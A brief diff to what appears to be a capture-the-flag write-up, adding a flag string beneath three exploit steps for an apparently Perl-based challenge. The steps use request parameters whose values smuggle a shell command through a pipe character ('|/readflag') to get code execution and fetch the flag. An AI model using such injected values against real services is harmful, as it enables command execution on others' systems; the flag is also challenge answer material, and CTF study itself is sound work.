@@ -14,3 +14,4 @@
 * `/?url=whatever&filename=|/readflag` creates the `|/readflag` file in cwd
 * `/?url=file:|/readflag&filename=flag` executes `/readflag` and stores it in the sandbox
 * `/sandbox/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/flag` downloads the flag from the sandbox
+* `hitcon{Perl_<3_y0u}`
